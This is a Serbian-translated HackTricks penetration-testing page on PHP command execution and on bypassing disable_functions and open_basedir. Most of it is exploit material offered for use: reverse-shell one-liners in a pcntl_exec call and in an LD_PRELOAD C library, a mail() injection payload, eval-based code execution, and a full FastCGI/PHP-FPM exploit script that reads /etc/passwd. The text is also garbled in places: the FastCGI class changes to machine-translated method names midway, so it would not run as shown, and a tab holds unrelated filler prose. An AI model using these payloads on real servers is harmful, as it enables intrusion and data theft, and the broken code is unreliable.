# PHP - Korisne funkcije & disable\_functions/open\_basedir zaobilazak

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## PHP Komande & IzvrÅ¡enje Koda

### PHP IzvrÅ¡enje Komandi

**Napomena:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell moÅ¾e **automatski** proveriti i zaobiÄ‡i sledeÄ‡e funkcije ako su neke od njih onemoguÄ‡ene.

**exec** - VraÄ‡a poslednju liniju izlaza komandi
```bash
echo exec("uname  -a");
```
**passthru** - ProsleÄ‘uje izlaz komandi direktno u pretraÅ¾ivaÄ
```bash
echo passthru("uname -a");
```
**sistem** - ProsleÄ‘uje izlaz komandi direktno u pretraÅ¾ivaÄ i vraÄ‡a poslednju liniju
```bash
echo system("uname -a");
```
**shell\_exec** - VraÄ‡a izlaz komandi
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Isti kao shell\_exec()
```bash
echo `uname -a`
```
**popen** - Otvara Äitanje ili pisanje cijevi ka procesu komande
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - SliÄno kao popen() ali sa veÄ‡im stepenom kontrole
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**  

**preg\_replace** funkcija se koristi za pretragu i zamenu uzorka u nizu koristeÄ‡i regularne izraze. Ova funkcija je korisna za manipulaciju tekstualnih podataka u PHP-u.
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - IzvrÅ¡ava program (podrazumevano, u modernom i ne baÅ¡ modernom PHP-u, morate uÄitati modul `pcntl.so` da biste koristili ovu funkciju)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**poÅ¡ta / mb\_send\_mail** - Ova funkcija se koristi za slanje mejlova, ali se moÅ¾e zloupotrebiti za ubacivanje proizvoljnih komandi unutar parametra `$options`. Ovo je zato Å¡to **php `mail` funkcija** obiÄno poziva `sendmail` binarni fajl unutar sistema i omoguÄ‡ava vam da **dodate dodatne opcije**. MeÄ‘utim, neÄ‡ete moÄ‡i videti izlaz iz izvrÅ¡ene komande, stoga se preporuÄuje kreiranje shell skripte koja piÅ¡e izlaz u fajl, izvrÅ¡ava je koristeÄ‡i mail, i prikazuje izlaz:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Ova funkcija moÅ¾e se koristiti za dinamiÄko uÄitavanje PHP ekstenzije. Ova funkcija neÄ‡e uvek biti prisutna, stoga treba proveriti da li je dostupna pre pokuÅ¡aja iskoriÅ¡Ä‡avanja. ProÄitajte [ovu stranicu da biste saznali kako iskoristiti ovu funkciju](disable\_functions-bypass-dl-function.md).

### IzvrÅ¡avanje PHP koda

Osim eval funkcije, postoje i drugi naÄini za izvrÅ¡avanje PHP koda: include/require se mogu koristiti za udaljeno izvrÅ¡avanje koda u obliku ranjivosti lokalnog ukljuÄivanja datoteke i udaljenog ukljuÄivanja datoteke.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## onemoguÄ‡i\_funkcije & otvori\_bazni\_dir

**OnemoguÄ‡ene funkcije** su postavke koje se mogu konfigurisati u `.ini` fajlovima u PHP-u koje Ä‡e **zabraniti** koriÅ¡Ä‡enje naznaÄenih **funkcija**. **Otvoreni bazni direktorijum** je postavka koja PHP-u pokazuje koji folder moÅ¾e pristupiti.\
PHP postavke treba konfigurisati na putanji _/etc/php7/conf.d_ ili sliÄno.

Oba podeÅ¡avanja mogu se videti u izlazu **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (490).png>)

## Bypass otvorenog baznog direktorijuma

`open_basedir` Ä‡e konfigurisati foldere kojima PHP moÅ¾e pristupiti, **neÄ‡ete moÄ‡i pisati/Äitati/izvrÅ¡avati bilo koji fajl van** tih foldera, ali takoÄ‘e **neÄ‡ete moÄ‡i ni da vidite** druge direktorijume.\
MeÄ‘utim, ako na neki naÄin moÅ¾ete izvrÅ¡iti proizvoljni PHP kod, moÅ¾ete **pokuÅ¡ati** sledeÄ‡i deo **koda** kako biste **zaobiÅ¡li** ograniÄenje.

### Listanje direktorijuma sa glob:// zaobilaskom

U ovom prvom primeru koristi se `glob://` protokol sa nekim zaobilaznim putanjama:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Napomena1**: U putanji takoÄ‘e moÅ¾ete koristiti `/e??/*` da biste naveli `/etc/*` i bilo koji drugi folder.\
**Napomena2**: Izgleda da je deo koda dupliciran, ali to je zapravo neophodno!\
**Napomena3**: Ovaj primer je koristan samo za listanje foldera, a ne za Äitanje fajlova

### Potpuni open\_basedir zaobilazak zloupotrebom FastCGI

Ako Å¾elite da **saznate viÅ¡e o PHP-FPM i FastCGI** moÅ¾ete proÄitati [prvi odeljak ove stranice](disable\_functions-bypass-php-fpm-fastcgi.md).\
Ako je **`php-fpm`** konfigurisan, moÅ¾ete ga zloupotrebiti da potpuno zaobiÄ‘ete **open\_basedir**:

![](<../../../../.gitbook/assets/image (542).png>)

![](<../../../../.gitbook/assets/image (574).png>)

Imajte na umu da prvo treba da pronaÄ‘ete gde se nalazi **unix socket php-fpm**. ObiÄno je to ispod `/var/run`, tako da moÅ¾ete **koristiti prethodni kod da biste naveli direktorijum i pronaÅ¡li ga**.\
Kod preuzet sa [ovde](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function zahtev(array $params, $stdin)
{
$response = '';
$this->povezi();
$zahtev = $this->napraviPaket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsZahtev = '';
foreach ($params as $kljuc => $vrednost) {
$paramsZahtev .= $this->napraviNvpar($kljuc, $vrednost);
}
if ($paramsZahtev) {
$zahtev .= $this->napraviPaket(self::PARAMS, $paramsZahtev);
}
$zahtev .= $this->napraviPaket(self::PARAMS, '');
if ($stdin) {
$zahtev .= $this->napraviPaket(self::STDIN, $stdin);
}
$zahtev .= $this->napraviPaket(self::STDIN, '');
fwrite($this->_sock, $zahtev);
do {
$odgovor = $this->procitajPaket();
if ($odgovor['type'] == self::STDOUT || $odgovor['type'] == self::STDERR) {
$response .= $odgovor['content'];
}
} while ($odgovor && $odgovor['type'] != self::END_REQUEST);
var_dump($odgovor);
if (!is_array($odgovor)) {
throw new Exception('LoÅ¡ zahtev');
}
switch (ord($odgovor['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Ova aplikacija ne moÅ¾e da multiplexuje [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Novi zahtev odbijen; previÅ¡e zauzeto [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Vrednost uloge nije poznata [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// pravi eksploataciju poÄinje ovde
if (!isset($_REQUEST['cmd'])) {
die("Proverite unos\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Ne radi niÅ¡ta
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Poziv: $uri\n\n";
echo $client->zahtev($params, $code)."\n";
?>
```
Ovi skriptovi Ä‡e komunicirati sa **unix socket-om php-fpm** (obiÄno smeÅ¡tenim u /var/run ako se koristi fpm) kako bi izvrÅ¡ili proizvoljni kod. Postavke `open_basedir` Ä‡e biti prebrisane atributom **PHP\_VALUE** koji se Å¡alje.\
Obratite paÅ¾nju kako se koristi `eval` za izvrÅ¡avanje PHP koda koji Å¡aljete unutar parametra **cmd**.\
TakoÄ‘e obratite paÅ¾nju na **komentarisani red 324**, moÅ¾ete ga odkomentarisati i **optereÄ‡enje Ä‡e automatski povezati sa datim URL-om i izvrÅ¡iti PHP kod** koji se tamo nalazi.\
Jednostavno pristupite `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` da biste dobili sadrÅ¾aj datoteke `/etc/passwd`.

{% hint style="warning" %}
MoÅ¾da razmiÅ¡ljate da na isti naÄin na koji smo prebrisali konfiguraciju `open_basedir` moÅ¾emo **prebrisati `disable_functions`**. Pa, pokuÅ¡ajte, ali neÄ‡e raditi, izgleda da **`disable_functions` moÅ¾e biti konfigurisan samo u `.ini` php** konfiguracionoj datoteci i promene koje vrÅ¡ite koristeÄ‡i PHP\_VALUE neÄ‡e biti efikasne na ovoj specifiÄnoj postavci.
{% endhint %}

## Bypass disable\_functions

Ako uspete da izvrÅ¡ite PHP kod unutar maÅ¡ine, verovatno Å¾elite da odete na sledeÄ‡i nivo i **izvrÅ¡ite proizvoljne sistemsko komande**. U ovoj situaciji je uobiÄajeno otkriti da su veÄ‡ina ili sve PHP **funkcije** koje omoguÄ‡avaju **izvrÅ¡avanje sistemskih komandi onemoguÄ‡ene** u **`disable_functions`.**\
Dakle, pogledajmo kako moÅ¾ete zaobiÄ‡i ovu restrikciju (ako moÅ¾ete)

### Automatsko otkrivanje zaobilaska

MoÅ¾ete koristiti alat [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) i on Ä‡e vam pokazati koju funkciju (ako postoji) moÅ¾ete koristiti za **zaobilaÅ¾enje** **`disable_functions`**.

### ZaobilaÅ¾enje koriÅ¡Ä‡enjem drugih sistemskih funkcija

Vratite se na poÄetak ove stranice i **proverite da li je neka od funkcija za izvrÅ¡avanje komandi onemoguÄ‡ena i dostupna u okruÅ¾enju**. Ako pronaÄ‘ete bar jednu od njih, moÄ‡i Ä‡ete je koristiti za izvrÅ¡avanje proizvoljnih sistemskih komandi.

### LD\_PRELOAD zaobilaÅ¾enje

Dobro je poznato da neke funkcije u PHP-u poput `mail()` Ä‡e **izvrÅ¡iti binarne datoteke unutar sistema**. Stoga, moÅ¾ete ih zloupotrebiti koristeÄ‡i promenljivu okruÅ¾enja `LD_PRELOAD` da bi uÄitali proizvoljnu biblioteku koja moÅ¾e izvrÅ¡iti bilo Å¡ta.

#### Funkcije koje se mogu koristiti za zaobilaÅ¾enje disable\_functions sa LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Efikasno kada je instaliran modul `php-mbstring`.
* **`imap_mail`**: Radi ako je prisutan modul `php-imap`.
* **`libvirt_connect`**: Zahteva modul `php-libvirt-php`.
* **`gnupg_init`**: Upotrebljivo sa instaliranim modulom `php-gnupg`.
* **`new imagick()`**: Ova klasa moÅ¾e biti zloupotrebljena za zaobilaÅ¾enje restrikcija. Detaljne tehnike eksploatacije mogu se pronaÄ‡i u sveobuhvatnom [**izveÅ¡taju ovde**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

MoÅ¾ete [**ovde pronaÄ‡i**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skriptu za ispitivanje koja je koriÅ¡Ä‡ena za pronalaÅ¾enje ovih funkcija.

Ovde je biblioteka koju moÅ¾ete kompajlirati da zloupotrebite `LD_PRELOAD` promenljivu okruÅ¾enja:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypassovanje koriÅ¡Ä‡enjem Chankro-a

Da biste iskoristili ovu konfiguraciju, moÅ¾ete koristiti [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Ovo je alat koji Ä‡e **generisati PHP eksploit** koji treba da otpremite na ranjivi server i izvrÅ¡ite ga (pristupite mu putem veba).\
**Chankro** Ä‡e upisati unutar diska Å¾rtve **biblioteku i obrnutu ljusku** koju Å¾elite da izvrÅ¡ite i koristiÄ‡e\*\* trik `LD_PRELOAD` + PHP `mail()`\*\* funkciju za izvrÅ¡avanje obrnute ljuske.

Imajte na umu da za koriÅ¡Ä‡enje **Chankro-a**, `mail` i `putenv` **ne smeju se pojaviti unutar liste `disable_functions`**.\
U sledeÄ‡em primeru moÅ¾ete videti kako **kreirati Chankro eksploit** za **arh 64**, koji Ä‡e izvrÅ¡iti `whoami` i saÄuvati izlaz u _/tmp/chankro\_shell.out_, Chankro Ä‡e **upisati biblioteku i payload** u _/tmp_ i **konaÄni eksploit** Ä‡e se zvati **bicho.php** (to je datoteka koju treba otpremiti na server Å¾rtve):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}

### Korisne funkcije PHP-a: disable_functions i open_basedir zaobilaÅ¾enje

U PHP-u postoji nekoliko korisnih funkcija koje se mogu iskoristiti prilikom testiranja bezbednosti veb aplikacija. Dve od ovih funkcija su `disable_functions` i `open_basedir`. 

#### disable_functions

`disable_functions` je opcija koja omoguÄ‡ava administratorima da zabrane odreÄ‘ene funkcije u PHP-u radi poveÄ‡anja sigurnosti servera. MeÄ‘utim, ovu opciju je moguÄ‡e zaobiÄ‡i ako ste u moguÄ‡nosti da izvrÅ¡avate sopstveni kod na serveru.

#### open_basedir zaobilaÅ¾enje

`open_basedir` je opcija koja ograniÄava skripte PHP-a da pristupaju samo odreÄ‘enim direktorijumima na serveru. MeÄ‘utim, postoje naÄini da se zaobiÄ‘e ovo ograniÄenje, omoguÄ‡avajuÄ‡i pristup drugim delovima sistema.

Ove funkcije mogu biti od koristi prilikom testiranja bezbednosti veb aplikacija kako biste identifikovali potencijalne ranjivosti i poboljÅ¡ali sigurnost servera. 

{% endtab %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Ako otkrijete da je funkcija **mail** blokirana onemoguÄ‡enim funkcijama, moÅ¾da Ä‡ete i dalje moÄ‡i koristiti funkciju **mb\_send\_mail.**\
ViÅ¡e informacija o ovoj tehnici i Chankro ovde: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" koriÅ¡Ä‡enjem PHP moguÄ‡nosti

Imajte na umu da koriÅ¡Ä‡enjem **PHP**-a moÅ¾ete **Äitati i pisati datoteke, kreirati direktorijume i menjati dozvole**.\
ÄŒak moÅ¾ete **izbaciti baze podataka**.\
MoÅ¾da koriÅ¡Ä‡enjem **PHP**-a za **enumeraciju** kutije moÅ¾ete pronaÄ‡i naÄin za eskalaciju privilegija/izvrÅ¡avanje komandi (na primer, Äitanje nekog privatnog ssh kljuÄa).

Kreirao sam webshell koji olakÅ¡ava izvoÄ‘enje ovih akcija (imajte na umu da Ä‡e vas veÄ‡ina webshellova takoÄ‘e ponuditi ovim opcijama): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass-ovi zavisni o modulima/verzijama

Postoje razliÄiti naÄini zaobilaÅ¾enja disable\_functions ako se koristi odreÄ‘eni modul ili iskoriÅ¡tava odreÄ‘ena PHP verzija:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass sa FFI - omoguÄ‡enim Foreign Function Interface-om**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass preko mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**dl funkcija**](disable\_functions-bypass-dl-function.md)
* [**Ovaj exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - iskoristiv sa manjim izmenama u PoC-u
* 7.0 - sve verzije do danas
* 7.1 - sve verzije do danas
* 7.2 - sve verzije do danas
* 7.3 - sve verzije do danas
* 7.4 - sve verzije do danas
* 8.0 - sve verzije do danas
* [**Od 7.0 do 8.0 eksploatacija (samo za Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatski alat**

Navedeni skript pokuÅ¡ava neke od ovde komentarisanih metoda:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Druge zanimljive PHP funkcije

### Lista funkcija koje prihvataju povratne pozive

Ove funkcije prihvataju string parametar koji bi mogao biti koriÅ¡Ä‡en za pozivanje funkcije izbora napadaÄa. Zavisno od funkcije, napadaÄ moÅ¾e ili ne mora imati moguÄ‡nost prosleÄ‘ivanja parametra. U tom sluÄaju moÅ¾e se koristiti funkcija Otkrivanja informacija poput phpinfo().

[Povratni pozivi / Pozivnici](https://www.php.net/manual/en/language.types.callable.php)

[PrateÄ‡e liste odavde](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Otkrivanje informacija

VeÄ‡ina ovih poziva funkcija nisu propusti. Ali moÅ¾e biti ranjivost ako je bilo koji od vraÄ‡enih podataka vidljiv napadaÄu. Ako napadaÄ moÅ¾e videti phpinfo(), to je definitivno ranjivost.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Ostalo
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Funkcije sistema datoteka

